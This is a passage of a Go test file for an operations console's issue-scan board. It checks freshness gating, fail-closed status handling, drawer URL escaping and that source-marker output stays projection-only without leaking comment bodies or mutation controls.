package graph

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"sync"
	"testing"
	"time"
)

// freshHiveCivilizationAssemblyProjectionFixture returns
// hiveCivilizationAssemblyProjectionFixture (graph/handlers_test.go) with its
// baked-in generated_at ("2026-06-23T09:30:00Z", which renders FreshnessStale
// against any realistic test clock) rewritten to now. Unblock hints/commands
// are gated to FreshnessCurrent only (buildConsoleIssueScan), so tests that
// assert real gh-command rendering must serve a fixture that lands current,
// not the shared fixture's stale timestamp.
func freshHiveCivilizationAssemblyProjectionFixture() string {
	const staleGeneratedAt = `"generated_at": "2026-06-23T09:30:00Z"`
	freshGeneratedAt := fmt.Sprintf(`"generated_at": %q`, time.Now().UTC().Format(time.RFC3339))
	replaced := strings.Replace(hiveCivilizationAssemblyProjectionFixture, staleGeneratedAt, freshGeneratedAt, 1)
	if replaced == hiveCivilizationAssemblyProjectionFixture {
		panic("freshHiveCivilizationAssemblyProjectionFixture: staleGeneratedAt marker not found in fixture; fixture format changed")
	}
	return replaced
}

func TestConsoleIssueScanCardAgentsCombinesAssignedAndTouching(t *testing.T) {
	// Assigned + touching are both surfaced (deduped, assigned first) so a
	// touching-only worker is not hidden behind the assignee; empty → unassigned.
	card := OpsCivilizationIssueScanKanbanCard{
		AssignedAgentIDs: []string{"agent_reviewer"},
		TouchingAgentIDs: []string{"agent_blocker_repair", "agent_reviewer"},
	}
	if got := consoleIssueScanCardAgents(card); got != "agent_reviewer, agent_blocker_repair" {
		t.Errorf("agents = %q, want assigned-first + touching-only, deduped", got)
	}
	if got := consoleIssueScanCardAgents(OpsCivilizationIssueScanKanbanCard{}); got != "unassigned" {
		t.Errorf("no agents = %q, want unassigned", got)
	}
	touchingOnly := OpsCivilizationIssueScanKanbanCard{TouchingAgentIDs: []string{"agent_x"}}
	if got := consoleIssueScanCardAgents(touchingOnly); got != "agent_x" {
		t.Errorf("touching-only = %q, want agent_x", got)
	}
}

func TestConsoleIssueScanCardURLRoundTripsMetacharacters(t *testing.T) {
	// A projected run/stage id with query metacharacters must round-trip
	// through the drawer URL exactly, or clicking the card opens the wrong
	// (or not-found) drawer. This guards the query-escaping in the builder
	// against the handler's r.URL.Query().Get decode.
	card := OpsCivilizationIssueScanKanbanCard{
		RunID:   "run+a&b#c=d",
		StageID: "stage a/b&x",
	}
	u, err := url.Parse(consoleIssueScanCardURL(card))
	if err != nil {
		t.Fatalf("parse drawer url: %v", err)
	}
	q := u.Query()
	if got := q.Get("run"); got != card.RunID {
		t.Errorf("run round-trip = %q, want %q", got, card.RunID)
	}
	if got := q.Get("stage"); got != card.StageID {
		t.Errorf("stage round-trip = %q, want %q", got, card.StageID)
	}
}

func TestConsoleIntakeCardDrawerHiddenWhenSurfaceUnavailable(t *testing.T) {
	// A projection that passes validation and carries issue-scan records but has
	// no generated_at is FreshnessUnavailable — the board hides its cards. The
	// drawer endpoint must honor the same gate: a direct card request must NOT
	// leak run details, or honest-staleness is one HTMX call away from bypass.
	hiveSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_, _ = io.WriteString(w, `{"projection_schema_version":"1.0.0","projection_subject":"civilization_assembly","derivation_status":"complete","issue_scan_projection":{"runs":[{"run_id":"run_x","target_issue":{"repo":"transpara-ai/site","number":1}}],"stages":[{"run_id":"run_x","stage_id":"stg_x","current_state":"parked","assigned_agent_ids":["secret_agent"]}]}}`)
	}))
	defer hiveSrv.Close()
	t.Setenv("HIVE_OPS_API_BASE_URL", hiveSrv.URL)

	h := newConsoleTestHandlers()
	mux := http.NewServeMux()
	h.Register(mux)

	req := httptest.NewRequest(http.MethodGet, "http://site.test/console/intake/card?run=run_x&stage=stg_x", nil)
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200", w.Code)
	}
	body := w.Body.String()
	if !strings.Contains(body, "not found") {
		t.Error("drawer must render honest not-found when the surface is unavailable")
	}
	if strings.Contains(body, "secret_agent") {
		t.Error("drawer leaked run details for an unavailable (timestamp-less) projection")
	}
}

func TestBuildConsoleIssueScanNilProjectionIsUnavailable(t *testing.T) {
	scan := buildConsoleIssueScan(nil, time.Now().UTC())
	if scan.Freshness != FreshnessUnavailable {
		t.Fatalf("freshness = %q, want unavailable", scan.Freshness)
	}
	if len(scan.Board.Columns) != 0 {
		t.Fatalf("nil projection must yield zero columns, got %d", len(scan.Board.Columns))
	}
	if len(scan.Notices) == 0 {
		t.Fatal("nil projection must carry an explicit notice")
	}
}

func TestBuildConsoleIssueScanFailedProjectionIsUnavailable(t *testing.T) {
	proj := &OpsCivilizationAssemblyProjection{
		DerivationStatus: opsCivilizationProjectionStatusFailed,
		GeneratedAt:      time.Now().UTC(), // failed sentinel carries a NON-zero timestamp
		FailureReasons:   []string{"hive civilization projection returned 503 Service Unavailable"},
	}
	scan := buildConsoleIssueScan(proj, time.Now().UTC())
	if scan.Freshness != FreshnessUnavailable {
		t.Fatalf("freshness = %q, want unavailable for failed status", scan.Freshness)
	}
	if len(scan.Notices) == 0 || !strings.Contains(scan.Notices[0], "503") {
		t.Fatalf("failed projection must surface its failure reason, got %v", scan.Notices)
	}
}

func TestBuildConsoleIssueScanZeroTimestampIsUnavailable(t *testing.T) {
	proj := &OpsCivilizationAssemblyProjection{DerivationStatus: "complete"} // GeneratedAt zero
	scan := buildConsoleIssueScan(proj, time.Now().UTC())
	if scan.Freshness != FreshnessUnavailable {
		t.Fatalf("freshness = %q, want unavailable for zero generated_at", scan.Freshness)
	}
}

func TestBuildConsoleIssueScanStaleTimestamp(t *testing.T) {
	now := time.Date(2026, 7, 1, 12, 0, 0, 0, time.UTC)
	proj := &OpsCivilizationAssemblyProjection{
		DerivationStatus: "complete",
		GeneratedAt:      now.Add(-2 * time.Minute), // older than consoleStaleWindow (30s)
	}
	scan := buildConsoleIssueScan(proj, now)
	if scan.Freshness != FreshnessStale {
		t.Fatalf("freshness = %q, want stale", scan.Freshness)
	}
}

func TestBuildConsoleIssueScanDerivationStatusAllowlistFailsClosed(t *testing.T) {
	now := time.Date(2026, 7, 1, 12, 0, 0, 0, time.UTC)
	records := OpsCivilizationIssueScanProjection{
		Runs: []OpsCivilizationIssueScanRunProjected{{
			RunID:       "run_u",
			TargetIssue: OpsCivilizationIssueRef{Repo: "transpara-ai/site", Number: 5},
		}},
	}
	// Only complete/partial are usable; every other status — including a FRESH
	// timestamp with real records — must fail closed. A denylist that only caught
	// "failed" would render these as live/stale data.
	for _, status := range []string{
		opsCivilizationProjectionStatusUnavailable,
		"some_future_status", // unknown enum value added later
		"",                   // missing status
		"COMPLETE-ish",       // near-miss must not slip through
	} {
		proj := &OpsCivilizationAssemblyProjection{
			DerivationStatus:    status,
			GeneratedAt:         now.Add(-5 * time.Second), // fresh — would be "current" if it leaked
			IssueScanProjection: records,
		}
		if scan := buildConsoleIssueScan(proj, now); scan.Freshness != FreshnessUnavailable {
			t.Errorf("derivation status %q: freshness = %q, want unavailable (fail closed)", status, scan.Freshness)
		}
	}

	// Sanity: the allowlisted statuses still render as usable data.
	for _, status := range []string{opsCivilizationProjectionStatusComplete, opsCivilizationProjectionStatusPartial} {
		proj := &OpsCivilizationAssemblyProjection{
			DerivationStatus:    status,
			GeneratedAt:         now.Add(-5 * time.Second),
			IssueScanProjection: records,
		}
		if scan := buildConsoleIssueScan(proj, now); scan.Freshness == FreshnessUnavailable {
			t.Errorf("derivation status %q: unexpectedly unavailable; complete/partial must render", status)
		}
	}
}

func TestBuildConsoleIssueScanCurrentPassesBoardThrough(t *testing.T) {
	now := time.Date(2026, 7, 1, 12, 0, 0, 0, time.UTC)
	proj := &OpsCivilizationAssemblyProjection{
		DerivationStatus: "complete",
		GeneratedAt:      now.Add(-5 * time.Second),
		IssueScanProjection: OpsCivilizationIssueScanProjection{
			Runs: []OpsCivilizationIssueScanRunProjected{{
				RunID:       "run_x",
				TargetIssue: OpsCivilizationIssueRef{Repo: "transpara-ai/site", Number: 200, Title: "Do the thing"},
			}},
		},
	}
	scan := buildConsoleIssueScan(proj, now)
	if scan.Freshness != FreshnessCurrent {
		t.Fatalf("freshness = %q, want current", scan.Freshness)
	}
	if len(scan.Board.Columns) == 0 {
		t.Fatal("a projected run must produce at least one board column")
	}
}

func TestBuildConsoleSourceMarkersRepresentsStatesAndRefs(t *testing.T) {
	now := time.Date(2026, 7, 6, 14, 15, 0, 0, time.UTC)
	transitions := []string{
		"acquired",
		"parked_human_action",
		"ready_for_human",
		"completed",
		"abandoned",
		"superseded",
	}
	markers := make([]OpsCivilizationIssueScanSourceMarkerProjected, 0, len(transitions))
	for _, transition := range transitions {
		markers = append(markers, sourceMarkerProjectionForConsoleTest(transition))
	}
	proj := &OpsCivilizationAssemblyProjection{
		DerivationStatus: opsCivilizationProjectionStatusComplete,
		GeneratedAt:      now.Add(-5 * time.Second),
		IssueScanSourceMarkers: OpsCivilizationIssueScanSourceMarkers{
			Status:  opsCivilizationFieldAvailable,
			Summary: "6 source marker projection(s).",
			Markers: markers,
		},
	}

	scan := buildConsoleIssueScan(proj, now)
	if !scan.SourceMarkers.Visible || !scan.SourceMarkers.Available {
		t.Fatalf("SourceMarkers visible/available = %v/%v, want true/true", scan.SourceMarkers.Visible, scan.SourceMarkers.Available)
	}
	if len(scan.SourceMarkers.Entries) != len(transitions) {
		t.Fatalf("entries = %d, want %d", len(scan.SourceMarkers.Entries), len(transitions))
	}
	gotTransitions := map[string]ConsoleSourceMarkerEntry{}
	for _, entry := range scan.SourceMarkers.Entries {
		gotTransitions[entry.Transition] = entry
	}
	for _, transition := range transitions {
		if _, ok := gotTransitions[transition]; !ok {
			t.Fatalf("missing source marker transition %q in %+v", transition, scan.SourceMarkers.Entries)
		}
	}

	acquired := gotTransitions["acquired"]
	for _, want := range []string{
		"projection_kind:work.issue_scan.source_marker_ref",
		"factory_order_id:fo_issue_scan_docs_256",
		"canonical_task_id:tsk_issue_scan_docs_256_research",
		"source_issue:github:transpara-ai/docs#256",
		"verification_test_case:tc_source_marker",
		"verification_gate_result:gate_source_marker",
		"failure_repair_waiver:waiver_repair_marker",
		"authority_exclusion:no_live_github_mutation_authority",
	} {
		if !consoleTestHasString(acquired.WorkRefs, want) {
			t.Errorf("acquired WorkRefs missing %q: %+v", want, acquired.WorkRefs)
		}
	}
	for _, want := range []string{
		"projection_kind:eventgraph.issue_scan.source_marker_projection",
		"canonical_source:work_eventgraph_projection",
		"eventgraph:issuescan.source.marker.projected:evt-acquired",
		"projection_only:true",
	} {
		if !consoleTestHasString(acquired.EventGraphRefs, want) {
			t.Errorf("acquired EventGraphRefs missing %q: %+v", want, acquired.EventGraphRefs)
		}
	}
	if !consoleTestHasString(acquired.EvidenceRefs, "test_case:tc_source_marker") || !consoleTestHasString(acquired.EvidenceRefs, "gate_result:gate_source_marker") {
		t.Fatalf("acquired evidence refs missing structured evidence: %+v", acquired.EvidenceRefs)
	}
	if !acquired.HasGitHubMarker || !acquired.GitHubDerivedOutput || !acquired.GitHubProjectionSink {
		t.Fatalf("GitHub marker = %+v, want derived projection sink", acquired)
	}

	parked := gotTransitions["parked_human_action"]
	if parked.StyleKind != "amber" || !parked.StaleTarget || !parked.WorkBlocked {
		t.Fatalf("parked marker = %+v, want amber stale blocked state", parked)
	}
	completed := gotTransitions["completed"]
	if completed.StyleKind != "ready" || completed.WorkLifecycleState != "certified" {
		t.Fatalf("completed marker = %+v, want certified ready-style state", completed)
	}
	superseded := gotTransitions["superseded"]
	if superseded.SupersededBy != "tsk_replacement_source_marker" {
		t.Fatalf("superseded_by = %q", superseded.SupersededBy)
	}

	fallbackMarker := sourceMarkerProjectionForConsoleTest("acquired")
	fallbackMarker.Target = OpsCivilizationIssueRef{Repo: "   ", URL: "https://example.invalid/wrong-target"}
	fallbackMarker.WorkRef.Target.Repository = "  transpara-ai/docs  "
	fallbackEntry, ok := buildConsoleSourceMarkerEntry(fallbackMarker, now)
	if !ok {
		t.Fatal("fallback marker unexpectedly invalid")
	}
	if fallbackEntry.IssueLabel != "transpara-ai/docs#256" {
		t.Fatalf("IssueLabel fallback = %q, want WorkRef target", fallbackEntry.IssueLabel)
	}
	if fallbackEntry.IssueURL != "" {
		t.Fatalf("IssueURL fallback = %q, want suppressed URL when label comes from WorkRef target", fallbackEntry.IssueURL)
	}
}

func TestConsoleSourceMarkersRenderProjectionOnlyAndIgnoreGitHubCommentBody(t *testing.T) {
	raw := `{
		"projection_schema_version": "1.7.0",
		"projection_subject": "civilization_assembly",
		"derivation_status": "complete",
		"generated_at": "2026-07-06T14:00:00Z",
		"issue_scan_source_markers": {
			"status": "available",
			"summary": "1 source marker projection.",
			"markers": [{
				"schema_version": "1",
				"projection_kind": "eventgraph.issue_scan.source_marker_projection",
				"transition": "parked_human_action",
				"run_id": "2026-07-06-docs-256",
				"target": {"repo": "transpara-ai/docs", "number": 256, "url": "https://github.com/transpara-ai/docs/issues/256", "state": "open"},
				"stage_id": "research_issue_and_repo_context",
				"stage_number": 1,
				"gate": "research_packet_posted",
				"work_ref": {
					"schema_version": "1",
					"projection_kind": "work.issue_scan.source_marker_ref",
					"canonical_source": "work",
					"projection_only": true,
					"run_id": "2026-07-06-docs-256",
					"target": {"repository": "transpara-ai/docs", "issue_number": 256},
					"stage": "research_issue_and_repo_context",
					"stage_number": 1,
					"gate": "research_packet_posted",
					"task_id": "019f5000-0000-7000-8000-000000000256",
					"canonical_task_id": "tsk_issue_scan_docs_256_research",
					"factory_order_id": "fo_issue_scan_docs_256",
					"lifecycle_state": "blocked",
					"blocked": true,
					"latest_blocker": {"reason": "stale_target", "detail": "source issue moved", "evidence_refs": ["eventgraph:blocker:1"]},
					"verification_refs": {"test_case_ids": ["tc_source_marker"]},
					"failure_repair_refs": {},
					"source_issue_refs": ["github:transpara-ai/docs#256"],
					"authority_exclusions": ["github_issue_markers_are_projection_only", "github_comments_are_not_work_lifecycle_truth", "github_labels_are_not_work_lifecycle_truth", "no_live_github_mutation_authority"]
				},
				"actor_id": "agent:eventgraph-projection",
				"actor_role": "projection_recorder",
				"occurred_at": "2026-07-06T13:59:00Z",
				"idempotency_key": "issuescan-source-marker:2026-07-06-docs-256:parked_human_action",
				"authority_boundary": "projection only; no GitHub mutation",
				"authority_exclusions": ["github_issue_markers_are_projection_only", "github_comments_are_not_work_lifecycle_truth", "github_labels_are_not_work_lifecycle_truth", "no_live_github_mutation_authority"],
				"evidence_refs": {"test_case_ids": ["tc_source_marker"], "gate_result_ids": ["gate_source_marker"]},
				"source_refs": ["eventgraph:issuescan.source.marker.projected:evt-parked", "work:fo_issue_scan_docs_256"],
				"github_marker": {
					"system": "github",
					"repository": "transpara-ai/docs",
					"issue_number": 256,
					"comment_id": "planned-marker-comment",
					"comment_url": "https://github.com/transpara-ai/docs/issues/256#issuecomment-1",
					"label_names": ["factory:parked"],
					"derived_output": true,
					"projection_sink": true,
					"comment_body": "github marker projection says lifecycle_state=certified factory_order_id=fo_fake gate=complete"
				},
				"canonical_source": "work_eventgraph_projection",
				"projection_only": true,
				"stale_target": true
			}]
		}
	}`
	proj := decodeProjectionFixture(t, raw)
	now := time.Date(2026, 7, 6, 14, 0, 5, 0, time.UTC)
	scan := buildConsoleIssueScan(proj, now)
	var buf bytes.Buffer
	if err := consoleIssueScan(scan).Render(context.Background(), &buf); err != nil {
		t.Fatalf("render: %v", err)
	}
	out := buf.String()

	for _, want := range []string{
		"source markers",
		"parked_human_action",
		"stale target",
		"canonical Work refs",
		"EventGraph projection refs",
		"derived GitHub marker (projection only)",
		"work.issue_scan.source_marker_ref",
		"eventgraph.issue_scan.source_marker_projection",
		"factory_order_id:fo_issue_scan_docs_256",
		"Idempotency",
		"projection only: true",
	} {
		if !strings.Contains(out, want) {
			t.Errorf("source marker render missing %q", want)
		}
	}
	for _, forbidden := range []string{
		"lifecycle_state=certified factory_order_id=fo_fake gate=complete",
		"comment_body",
		"gh issue edit",
		"hx-post",
		`method="post"`,
	} {
		if strings.Contains(out, forbidden) {
			t.Errorf("source marker render leaked forbidden %q", forbidden)
		}
	}
}

func TestConsoleSourceMarkersEmptyAndUnavailableStates(t *testing.T) {
	empty := ConsoleSourceMarkers{Visible: true, Available: true}
	var emptyBuf bytes.Buffer
	if err := consoleSourceMarkers(empty).Render(context.Background(), &emptyBuf); err != nil {
		t.Fatalf("render empty: %v", err)
	}
	if !strings.Contains(emptyBuf.String(), `data-state="source-markers-empty"`) {
		t.Error("available source-marker section with zero entries must render an explicit empty state")
	}

	unavailable := ConsoleSourceMarkers{
		Visible:   true,
		Available: false,
		Status:    "unavailable",
		Entries: []ConsoleSourceMarkerEntry{{
			RunID: "must_not_render",
		}},
	}
	var unavailableBuf bytes.Buffer
	if err := consoleSourceMarkers(unavailable).Render(context.Background(), &unavailableBuf); err != nil {
		t.Fatalf("render unavailable: %v", err)
	}
	out := unavailableBuf.String()
	if !strings.Contains(out, "source-marker projection unavailable") {
		t.Error("unavailable source-marker section must render the section status")
	}
	if strings.Contains(out, "must_not_render") {
		t.Error("unavailable source-marker section must not render stale entry data")
	}

	truncated := ConsoleSourceMarkers{Visible: true, Available: true, Truncated: true}
	var truncatedBuf bytes.Buffer
	if err := consoleSourceMarkers(truncated).Render(context.Background(), &truncatedBuf); err != nil {
		t.Fatalf("render truncated: %v", err)
	}
	if !strings.Contains(truncatedBuf.String(), "truncated") {
		t.Error("available truncated source-marker section must render the truncation badge")
	}

	truncatedUnavailable := ConsoleSourceMarkers{Visible: true, Available: false, Status: "unavailable", Truncated: true}
	var truncatedUnavailableBuf bytes.Buffer
	if err := consoleSourceMarkers(truncatedUnavailable).Render(context.Background(), &truncatedUnavailableBuf); err != nil {
		t.Fatalf("render unavailable truncated: %v", err)
	}
	if strings.Contains(truncatedUnavailableBuf.String(), "truncated") {
		t.Error("unavailable source-marker section must not pair a truncated badge with unavailable evidence")
	}
}

func TestConsoleSourceMarkerCommentURLWithoutIDUsesHonestPlaceholder(t *testing.T) {
	markers := ConsoleSourceMarkers{
		Visible:   true,
		Available: true,
		Entries: []ConsoleSourceMarkerEntry{{
			Transition:             "acquired",
			IssueLabel:             "transpara-ai/docs#256",
			RunID:                  "run-comment-placeholder",
			HasGitHubMarker:        true,
			GitHubMarkerSystem:     "github",
			GitHubMarkerIssueLabel: "transpara-ai/docs#256",
			GitHubMarkerCommentURL: "https://github.com/transpara-ai/docs/issues/256#issuecomment-1",
			GitHubDerivedOutput:    true,
			GitHubProjectionSink:   true,
		}},
	}
	var buf bytes.Buffer
	if err := consoleSourceMarkers(markers).Render(context.Background(), &buf); err != nil {
		t.Fatalf("render: %v", err)
	}
	out := buf.String()
	if !strings.Contains(out, "comment id not projected") {
		t.Error("comment URL without comment ID must render an honest missing-ID placeholder")
	}
	if strings.Contains(out, "comment projected") {
		t.Error("comment URL without comment ID must not claim the ID was projected")
	}
}

func TestConsoleSourceMarkersAbsentFieldLeavesNoTrace(t *testing.T) {
	proj := decodeProjectionFixture(t, hiveCivilizationAssemblyProjectionFixture)
	now := time.Date(2026, 6, 23, 9, 30, 5, 0, time.UTC)
	scan := buildConsoleIssueScan(proj, now)
	if scan.SourceMarkers.Visible {
		t.Fatal("legacy payload without issue_scan_source_markers must keep SourceMarkers invisible")
	}
	var buf bytes.Buffer
	if err := consoleIssueScan(scan).Render(context.Background(), &buf); err != nil {
		t.Fatalf("render: %v", err)
	}
	if strings.Contains(buf.String(), "data-console-source-markers") {
		t.Error("legacy payload without issue_scan_source_markers must leave no marker section trace")
	}
}

func TestConsoleIntakeFragmentRendersSourceMarkers(t *testing.T) {
	now := time.Date(2026, 7, 6, 14, 15, 0, 0, time.UTC)
	proj := &OpsCivilizationAssemblyProjection{
		ProjectionSchemaVersion: "1.7.0",
		ProjectionSubject:       "civilization_assembly",
		DerivationStatus:        opsCivilizationProjectionStatusComplete,
		GeneratedAt:             now,
		IssueScanSourceMarkers: OpsCivilizationIssueScanSourceMarkers{
			Status:  opsCivilizationFieldAvailable,
			Summary: "1 source marker projection.",
			Markers: []OpsCivilizationIssueScanSourceMarkerProjected{sourceMarkerProjectionForConsoleTest("completed")},
		},
	}
	hiveSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		if err := json.NewEncoder(w).Encode(proj); err != nil {
			t.Fatalf("encode projection: %v", err)
		}
	}))
	defer hiveSrv.Close()
	t.Setenv("HIVE_OPS_API_BASE_URL", hiveSrv.URL)

	h := newConsoleTestHandlers()
	mux := http.NewServeMux()
	h.Register(mux)

	req := httptest.NewRequest(http.MethodGet, "http://site.test/console/intake/fragment", nil)
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200; body: %s", w.Code, w.Body.String())
	}
	body := w.Body.String()
	for _, want := range []string{"data-console-source-markers", "source markers", "completed", "derived GitHub marker"} {
		if !strings.Contains(body, want) {
			t.Errorf("fragment missing %q", want)
		}
	}
}

func TestBuildConsoleSourceMarkersFreshnessGate(t *testing.T) {
	now := time.Date(2026, 7, 6, 14, 15, 0, 0, time.UTC)
	proj := &OpsCivilizationAssemblyProjection{
		IssueScanSourceMarkers: OpsCivilizationIssueScanSourceMarkers{
			Status:  opsCivilizationFieldAvailable,
			Markers: []OpsCivilizationIssueScanSourceMarkerProjected{sourceMarkerProjectionForConsoleTest("acquired")},
		},
	}
	for _, freshness := range []ConsoleFreshness{FreshnessCurrent, FreshnessStale, FreshnessPartial} {
		got := buildConsoleSourceMarkers(proj, freshness, now)
		if !got.Visible || !got.Available || len(got.Entries) != 1 {
			t.Fatalf("freshness %q = %+v, want one visible marker", freshness, got)
		}
	}
	for _, freshness := range []ConsoleFreshness{FreshnessUnavailable, ConsoleFreshness("future")} {
		got := buildConsoleSourceMarkers(proj, freshness, now)
		if got.Visible || got.Available || len(got.Entries) != 0 {
			t.Fatalf("freshness %q = %+v, want no visible marker section", freshness, got)
		}
	}
}

func TestBuildConsoleSourceMarkersNonAvailableStatusWithholdsEntries(t *testing.T) {
	now := time.Date(2026, 7, 6, 14, 15, 0, 0, time.UTC)
	for _, status := range []string{opsCivilizationFieldUnavailable, "some_future_status"} {
		proj := &OpsCivilizationAssemblyProjection{
			IssueScanSourceMarkers: OpsCivilizationIssueScanSourceMarkers{
				Status:  status,
				Markers: []OpsCivilizationIssueScanSourceMarkerProjected{sourceMarkerProjectionForConsoleTest("acquired")},
			},
		}
		got := buildConsoleSourceMarkers(proj, FreshnessCurrent, now)
		if !got.Visible || got.Available || len(got.Entries) != 0 || got.WithheldCount != 0 {
			t.Fatalf("status %q = %+v, want visible unavailable section with no entries", status, got)
		}
	}
}

func TestBuildConsoleSourceMarkersWithholdsInvalidAndCapsEntries(t *testing.T) {
	now := time.Date(2026, 7, 6, 14, 15, 0, 0, time.UTC)
	markers := []OpsCivilizationIssueScanSourceMarkerProjected{{}, {Transition: "acquired"}}
	for i := 0; i < consoleSourceMarkerRenderLimit+2; i++ {
		marker := sourceMarkerProjectionForConsoleTest("acquired")
		marker.RunID = fmt.Sprintf("run-%02d", i)
		marker.WorkRef.RunID = marker.RunID
		marker.IdempotencyKey = fmt.Sprintf("marker-%02d", i)
		marker.OccurredAt = now.Add(time.Duration(i) * time.Minute).Format(time.RFC3339)
		markers = append(markers, marker)
	}
	proj := &OpsCivilizationAssemblyProjection{
		IssueScanSourceMarkers: OpsCivilizationIssueScanSourceMarkers{
			Status:  opsCivilizationFieldAvailable,
			Markers: markers,
		},
	}
	got := buildConsoleSourceMarkers(proj, FreshnessCurrent, now)
	if len(got.Entries) != consoleSourceMarkerRenderLimit {
		t.Fatalf("entries = %d, want render cap %d", len(got.Entries), consoleSourceMarkerRenderLimit)
	}
	if got.Entries[0].RunID != "run-51" || got.Entries[len(got.Entries)-1].RunID != "run-02" {
		t.Fatalf("cap kept wrong marker order: first=%s last=%s, want newest 50 by occurred_at", got.Entries[0].RunID, got.Entries[len(got.Entries)-1].RunID)
	}
	if got.WithheldCount != 4 || got.WithheldReason != "missing identifiers or local render cap" {
		t.Fatalf("withheld = %d/%q, want 4 combined reason", got.WithheldCount, got.WithheldReason)
	}
	var buf bytes.Buffer
	if err := consoleSourceMarkers(got).Render(context.Background(), &buf); err != nil {
		t.Fatalf("render: %v", err)
	}
	out := buf.String()
	if !strings.Contains(out, `data-state="source-markers-withheld"`) || !strings.Contains(out, "missing identifiers or local render cap") {
		t.Fatalf("withheld notice missing from output: %s", out)
	}
}

func TestConsoleIntakeRendersIssueScanBoard(t *testing.T) {
	hiveSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/api/hive/civilization/assembly-projection" {
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		_, _ = io.WriteString(w, hiveCivilizationAssemblyProjectionFixture)
	}))
	defer hiveSrv.Close()
	t.Setenv("HIVE_OPS_API_BASE_URL", hiveSrv.URL)

	h := newConsoleTestHandlers()
	mux := http.NewServeMux()
	h.Register(mux)

	req := httptest.NewRequest(http.MethodGet, "http://site.test/console/intake", nil)
	w := httptest.NewRecorder()
	mux.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200; body: %s", w.Code, w.Body.String())
	}
	body := w.Body.String()
	// Issue ref, a working agent, a stage, and a blocker from the fixture.
	// agent_blocker_repair is a TOUCHING-only agent on run_docs_172; asserting it
	// proves the card surfaces touching agents, not just the assignee.
	for _, want := range []string{"transpara-ai/docs#172", "agent_reviewer", "agent_blocker_repair", "run_adversarial_review", "duplicate_chain"} {
		if !strings.Contains(body, want) {
			t.Errorf("intake board missing %q", want)
		}
	}
	// This shared fixture has NO ready_for_human card (states are parked /
	// human_action only), so the "not merged" affordance is asserted in the
	// dedicated card-render tests below, not here.
}

func TestConsoleIssueScanCardShowsProjectionSourceProvenance(t *testing.T) {
	// A ready issue-intake FALLBACK card (projection-only, not runtime evidence)
	// must surface its provenance so it cannot masquerade as a runtime lifecycle
	// card just because CurrentState is ready_for_human.
	fallback := OpsCivilizationIssueScanKanbanCard{
		CurrentState:     "ready_for_human",
		ProjectionSource: "scanner issue-intake fallback; not runtime execution or agent-touch evidence",
		TargetIssue:      OpsCivilizationIssueRef{Repo: "transpara-ai/site", Number: 9},
	}
	var buf bytes.Buffer
	if err := consoleIssueScanCard(fallback).Render(context.Background(), &buf); err != nil {
		t.Fatalf("render: %v", err)
	}
	out := buf.String()
	if !strings.Contains(out, "scanner issue-intake fallback") {
		t.Error("card must surface ProjectionSource provenance so fallback cards are distinguishable from runtime cards")
	}
	if !strings.Contains(out, "not merged") {
		t.Error("ready fallback card still shows the no-merge boundary (state is genuinely ready_for_human)")
	}
}

func TestConsoleIssueScanDrawerLinksProjectedIssueURL(t *testing.T) {
	linked := OpsCivilizationIssueScanKanbanCard{
		RunID:       "run_l",
		TargetIssue: OpsCivilizationIssueRef{Repo: "transpara-ai/site", Number: 42, URL: "https://github.com/transpara-ai/site/issues/42"},
	}
	var buf bytes.Buffer
	if err := consoleIssueScanDrawer(linked, true, consoleUnblockPlan{}, false).Render(context.Background(), &buf); err != nil {
		t.Fatalf("render: %v", err)
	}
	if !strings.Contains(buf.String(), `href="https://github.com/transpara-ai/site/issues/42"`) {
		t.Errorf("drawer must link the projected issue URL; got: %s", buf.String())
	}

	// No projected URL → plain text label, no dangling empty anchor.
	noURL := OpsCivilizationIssueScanKanbanCard{RunID: "r", TargetIssue: OpsCivilizationIssueRef{Repo: "transpara-ai/site", Number: 43}}
	var buf2 bytes.Buffer
	if err := consoleIssueScanDrawer(noURL, true, consoleUnblockPlan{}, false).Render(context.Background(), &buf2); err != nil {
		t.Fatalf("render: %v", err)
	}
	if strings.Contains(buf2.String(), "<a href") {
		t.Error("drawer must not render an issue anchor when no URL is projected")
	}
}

// TestConsoleRecentRunsRailRendersChipsWithDrawerLinkAndPlainSpan asserts the
// rail's two chip shapes: a linked entry (its (RunID, StageID) is on the
// rendered board) renders as an <a> with the hx-get/hx-target/hx-swap drawer
// wiring, while an unlinked entry renders as a plain <span> with no hx-get at
// all — the rail must never fabricate a drawer target for a run the board
// itself doesn't expose.
func TestConsoleRecentRunsRailRendersChipsWithDrawerLinkAndPlainSpan(t *testing.T) {
	scan := ConsoleIssueScan{
		Freshness: FreshnessCurrent,
		Board: OpsCivilizationIssueScanKanban{
			Columns: []OpsCivilizationIssueScanKanbanColumn{
				{Label: "Parked", Cards: []OpsCivilizationIssueScanKanbanCard{
					{RunID: "run_linked", StageID: "stage_linked", TargetIssue: OpsCivilizationIssueRef{Repo: "transpara-ai/site", Number: 42}},
				}},
			},
		},
		RecentRuns: ConsoleRecentRuns{
			Available: true,
			Entries: []ConsoleRecentRunEntry{
				{
					RunID:      "run_linked",
					StageID:    "stage_linked",
					IssueLabel: "transpara-ai/site#42",
					State:      "parked",
					StyleKind:  "amber",
					Age:        "5m ago",
					Linked:     true,
					DrawerURL:  consoleIssueScanCardURL(OpsCivilizationIssueScanKanbanCard{RunID: "run_linked", StageID: "stage_linked"}),
				},
				{
					RunID:      "run_unlinked",
					StageID:    "stage_unlinked",
					IssueLabel: "transpara-ai/site#43",
					State:      "queued",
					StyleKind:  "neutral",
					Linked:     false,
				},
			},
		},
	}
	var buf bytes.Buffer
	if err := consoleIssueScan(scan).Render(context.Background(), &buf); err != nil {
		t.Fatalf("render: %v", err)
	}
	out := buf.String()

	if !strings.Contains(out, "data-console-rail") {
		t.Error("rail must render data-console-rail on its container when Available")
	}
